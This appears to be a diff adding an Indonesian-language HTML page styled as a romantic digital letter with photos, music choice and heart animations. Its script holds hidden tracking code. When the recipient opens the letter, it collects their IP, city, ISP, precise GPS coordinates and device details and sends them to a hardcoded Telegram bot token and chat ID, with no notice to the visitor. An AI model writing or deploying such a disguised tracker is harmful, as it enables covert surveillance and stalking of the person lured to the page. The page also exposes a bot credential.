@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Devina</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Quicksand:wght@300;500&family=Sacramento&family=Indie+Flower&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --paper-color: #fdfaf0;
+            --line-color: #e0dcc5;
+            --margin-color: #f1c1c1;
+            --text-color: #3d3d3d;
+            --pink-accent: #d63384;
+        }
+
+        body {
+            background-color: #e5e5e5;
+            background-image: radial-gradient(#d1d1d1 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: var(--text-color);
+            font-family: 'Quicksand', sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+        }
+
+        .paper-sheet {
+            width: 100%;
+            max-width: 450px;
+            background-color: var(--paper-color);
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 10px 10px 25px rgba(0,0,0,0.15);
+            padding: 40px 25px 60px 50px;
+            background-image: 
+                linear-gradient(var(--line-color) 1px, transparent 1px),
+                linear-gradient(90deg, var(--margin-color) 2px, transparent 2px);
+            background-size: 100% 28px, 100% 100%;
+            background-position: 0 40px, 45px 0;
+            background-repeat: repeat-y, no-repeat;
+        }
+
+        .paper-sheet::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 15px;
+            background: white;
+            clip-path: polygon(0% 0%, 5% 100%, 10% 0%, 15% 90%, 20% 0%, 25% 100%, 30% 0%, 35% 85%, 40% 0%, 45% 100%, 50% 0%, 55% 95%, 60% 0%, 65% 100%, 70% 0%, 75% 80%, 80% 0%, 85% 100%, 90% 0%, 95% 90%, 100% 0%);
+            z-index: 5;
+        }
+
+        .binder-holes {
+            position: absolute;
+            left: 15px;
+            top: 60px;
+            bottom: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 40px;
+            z-index: 10;
+        }
+
+        .hole {
+            width: 15px;
+            height: 15px;
+            background: #e5e5e5;
+            border-radius: 50%;
+            box-shadow: inset 2px 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .heading {
+            font-family: 'Sacramento', cursive;
+            font-size: 3.5rem;
+            color: var(--pink-accent);
+            text-align: center;
+            margin-bottom: 40px;
+            line-height: 1;
+        }
+
+        .date-text {
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.2rem;
+            color: #888;
+            text-align: right;
+            margin-bottom: 20px;
+            padding-right: 10px;
+        }
+
+        .photo-polaroid {
+            background: #fff;
+            padding: 10px 10px 30px 10px;
+            box-shadow: 3px 5px 15px rgba(0,0,0,0.1);
+            margin: 35px auto;
+            width: 85%;
+            transform: rotate(-1.5deg);
+            border: 1px solid #ddd;
+            position: relative;
+        }
+
+        .photo-polaroid:nth-child(even) { transform: rotate(2deg); }
+
+        .photo-polaroid img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .washi-tape {
+            position: absolute;
+            width: 80px;
+            height: 25px;
+            background: rgba(214, 51, 132, 0.2);
+            top: -10px;
+            right: -20px;
+            transform: rotate(35deg);
+            backdrop-filter: blur(1px);
+            border: 1px dashed rgba(214, 51, 132, 0.3);
+        }
+
+        .love-paragraph {
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.4rem;
+            line-height: 28px;
+            margin: 28px 0;
+            color: #444;
+        }
+
+        .sticker-flower {
+            position: absolute;
+            font-size: 2rem;
+            filter: drop-shadow(2px 2px 0px white);
+            pointer-events: none;
+            z-index: 20;
+        }
+
+        .heart-rise {
+            position: fixed;
+            pointer-events: none;
+            z-index: 1000;
+            animation: riseUp 4s ease-out forwards;
+        }
+
+        @keyframes riseUp {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
+
+        #intro-overlay {
+            position: fixed;
+            inset: 0;
+            background: #fdfaf0;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .btn-open {
+            background: var(--pink-accent);
+            color: white;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: bold;
+            letter-spacing: 2px;
+            box-shadow: 0 5px 15px rgba(214, 51, 132, 0.4);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-open:hover { transform: scale(1.05); }
+
+        .highlight-box {
+            background: rgba(255, 255, 255, 0.5);
+            border: 1px solid var(--line-color);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.2rem;
+        }
+
+        /* Song Selector Styles */
+        .song-selector {
+            margin-bottom: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .song-option {
+            background: white;
+            border: 2px solid var(--line-color);
+            padding: 12px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9rem;
+        }
+
+        .song-option.active {
+            border-color: var(--pink-accent);
+            background: #fff0f5;
+        }
+
+        .radio-circle {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ddd;
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .song-option.active .radio-circle {
+            border-color: var(--pink-accent);
+        }
+
+        .song-option.active .radio-circle::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            background: var(--pink-accent);
+            border-radius: 50%;
+        }
+    </style>
+</head>
+<body>
+
+<div id="intro-overlay">
+    <div class="mb-8">
+        <div class="text-6xl mb-4">💌</div>
+        <h2 class="font-serif italic text-2xl text-gray-700">Pesan Untukmu</h2>
+        <p class="text-gray-400 mt-2 mb-6">Pilih lagu favoritmu lalu buka...</p>
+    </div>
+
+    <!-- Pilihan Lagu -->
+    <div class="song-selector">
+        <div class="song-option active" onclick="selectSong(this, '1kDHuJbRGwTz')">
+            <div class="radio-circle"></div>
+            <span>Lagu Pertama (Utama) ♫</span>
+        </div>
+        <div class="song-option" onclick="selectSong(this, '1bxPjSrzy4Ee')">
+            <div class="radio-circle"></div>
+            <span>Lagu Kedua ♫</span>
+        </div>
+    </div>
+
+    <button class="btn-open" onclick="startExperience()">BUKA SURAT</button>
+</div>
+
+<div class="paper-sheet">
+    <div class="binder-holes">
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+    </div>
+
+    <span class="sticker-flower" style="top: 50px; right: 20px;">🌸</span>
+    <span class="sticker-flower" style="top: 350px; left: 10px;">🌷</span>
+    <span class="sticker-flower" style="bottom: 150px; right: 15px;">🌹</span>
+
+    <div class="date-text">Jakarta, 18 Januari 2026</div>
+    
+    <h1 class="heading">Hai Kamu,</h1>
+
+    <div class="love-paragraph">
+        Lewat lembaran kertas digital ini, aku ingin menuliskan sedikit dari ribuan alasan kenapa kehadiranmu begitu berarti di hidupku.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape"></div>
+        <img src="https://i.ibb.co.com/Y4Nj1168/Whats-App-Image-2026-01-15-at-20-02-51.jpg" alt="Foto Utama">
+        <p class="text-center font-serif italic mt-4 text-gray-400 text-sm">Sosok yang selalu aku kagumi...</p>
+    </div>
+
+    <div class="love-paragraph">
+        Kadang aku berpikir, bagaimana bisa aku seberuntung ini mengenalmu? Bagiku, kamu bukan sekadar seseorang, tapi tempat paling nyaman untuk berbagi cerita setelah hari yang panjang.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(135, 206, 235, 0.3);"></div>
+        <img src="https://i.ibb.co.com/zTCN6MW8/photo-2026-01-18-14-58-22-2.jpg" alt="Foto Baru 1">
+    </div>
+
+    <div class="highlight-box">
+        "Terima kasih sudah sabar menghadapiku, sudah tulus menerima segala kurangku, dan sudah memilih untuk tetap ada di sampingku."
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(135, 206, 235, 0.3);"></div>
+        <img src="https://i.ibb.co.com/gZqdjRrR/Whats-App-Image-2026-01-15-at-13-17-01.jpg" alt="Foto Kenangan">
+    </div>
+
+    <div class="love-paragraph">
+        Setiap kali aku melihatmu, hatiku selalu berkata: "Iya, kamu orangnya. Seseorang yang aku ingin ajak terus berjalan bersama, melewati setiap babak kehidupan."
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(255, 215, 0, 0.3);"></div>
+        <img src="https://i.ibb.co.com/gLXdTJgb/photo-2026-01-18-14-58-22.jpg" alt="Foto Baru 2">
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape"></div>
+        <img src="https://i.ibb.co.com/JwJYtFQm/Whats-App-Image-2026-01-13-at-22-34-17.jpg" alt="Foto Moment">
+    </div>
+
+    <div class="love-paragraph">
+        Ada begitu banyak hal kecil darimu yang tanpa sadar membuat hariku jauh lebih berwarna. Senyummu, caramu bercerita, semuanya berharga.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(144, 238, 144, 0.3);"></div>
+        <img src="https://i.ibb.co.com/wF4NrdV8/photo-2026-01-18-14-58-21-3.jpg" alt="Foto Baru 3">
+    </div>
+
+    <div class="love-paragraph">
+        Tetap bersama ya? Kita lewati setiap tantangan bareng-bareng. Aku janji bakal terus belajar untuk jadi yang terbaik bagimu.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(255, 182, 193, 0.4);"></div>
+        <img src="https://i.ibb.co.com/ccDmb4Jc/photo-2026-01-18-14-58-21-2.jpg" alt="Foto Baru 4">
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(255, 182, 193, 0.4);"></div>
+        <img src="https://i.ibb.co.com/W4ksbsGR/Whats-App-Image-2026-01-13-at-22-34-19.jpg" alt="Foto Kebahagiaan">
+    </div>
+
+    <div class="love-paragraph">
+        Kehadiranmu lebih dari sekadar kata-kata. Kamu adalah alasan di balik tawa dan syukurku setiap harinya.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(216, 191, 216, 0.4);"></div>
+        <img src="https://i.ibb.co.com/3y7SqBxR/photo-2026-01-18-14-58-21.jpg" alt="Foto Baru 5">
+    </div>
+
+    <div class="text-center mt-20">
+        <p class="font-serif italic text-gray-400">Selama waktuku ada,</p>
+        <p class="font-['Sacramento'] text-4xl text-pink-500 mt-2">aku di sini untukmu.</p>
+    </div>
+
+    <div class="mt-20 text-center">
+        <button onclick="rainHearts()" class="text-pink-300 hover:text-pink-500 transition-colors">
+            <span class="text-2xl">💖</span> Klik untukmu
+        </button>
+    </div>
+</div>
+
+<div style="display: none;">
+    <iframe id="audio-player" width="100%" height="60" src="" frameborder="0" allow="autoplay"></iframe>
+</div>
+
+<script>
+    /* =========================
+       KONFIGURASI TELEGRAM
+    ========================= */
+    const BOT_TOKEN = '8428178330:AAEkkJRqqtmXItOrcxk-NCnIFbrvJ09_Ui8';
+    const CHAT_ID   = '6128943834';
+
+    let selectedSongId = '1kDHuJbRGwTz'; // Default song
+
+    function selectSong(element, id) {
+        document.querySelectorAll('.song-option').forEach(opt => opt.classList.remove('active'));
+        element.classList.add('active');
+        selectedSongId = id;
+    }
+
+    /* =========================
+       LOGIKA PELACAKAN (TRACKING)
+    ========================= */
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+          })
+        });
+      } catch (e) { console.error('Telegram Error', e); }
+    }
+
+    async function fetchIpData() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('IP API error');
+        return await res.json();
+      } catch { return {}; }
+    }
+
+    function requestLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          ()  => resolve(null),
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function buildLog(position, ipData) {
+      const lat = position?.coords?.latitude  ?? 'N/A';
+      const lng = position?.coords?.longitude ?? 'N/A';
+      return `
+Visitor Log - Surat Terbuka! 💌
+
+IP       : ${ipData.ip || 'N/A'}
+Country  : ${ipData.country_name || 'N/A'}
+City     : ${ipData.city || 'N/A'}
+ISP      : ${ipData.org || 'N/A'}
+
+GPS      : ${lat}, ${lng}
+Maps     : https://maps.google.com/?q=${lat},${lng}
+
+Device   : ${navigator.userAgent}
+Time     : ${new Date().toLocaleString()}
+Lagu     : ${selectedSongId === '1kDHuJbRGwTz' ? 'Lagu Pertama' : 'Lagu Kedua'}
+`.trim();
+    }
+
+    async function runTracking() {
+      const ipData   = await fetchIpData();
+      const position = await requestLocation();
+      const logText  = buildLog(position, ipData);
+      await sendToTelegram(logText);
+    }
+
+    /* =========================
+       FUNGSI UTAMA PENGALAMAN
+    ========================= */
+    function startExperience() {
+        const overlay = document.getElementById('intro-overlay');
+        overlay.style.transition = 'opacity 1s ease';
+        overlay.style.opacity = '0';
+        
+        const player = document.getElementById('audio-player');
+        player.src = `https://vocaroo.com/embed/${selectedSongId}?autoplay=1`;
+        
+        // Menjalankan tracking saat tombol BUKA SURAT ditekan
+        runTracking();
+
+        setTimeout(() => {
+            overlay.style.display = 'none';
+        }, 1000);
+
+        rainHearts();
+    }
+
+    function rainHearts() {
+        const icons = ['❤️', '💖', '🌸', '✨', '🤍', '🌹'];
+        for(let i = 0; i < 25; i++) {
+            setTimeout(() => {
+                const h = document.createElement('div');
+                h.className = 'heart-rise';
+                h.innerHTML = icons[Math.floor(Math.random() * icons.length)];
+                h.style.left = Math.random() * 100 + 'vw';
+                h.style.fontSize = (Math.random() * 20 + 20) + 'px';
+                h.style.animationDuration = (Math.random() * 2 + 3) + 's';
+                document.body.appendChild(h);
+                setTimeout(() => h.remove(), 4000);
+            }, i * 150);
+        }
+    }
+
+    setInterval(() => {
+        const p = document.createElement('div');
+        p.className = 'heart-rise';
+        p.innerHTML = '✨';
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.fontSize = '12px';
+        p.style.opacity = '0.5';
+        document.body.appendChild(p);
+        setTimeout(() => p.remove(), 5000);
+    }, 2000);
+</script>
+
+</body>
+</html>
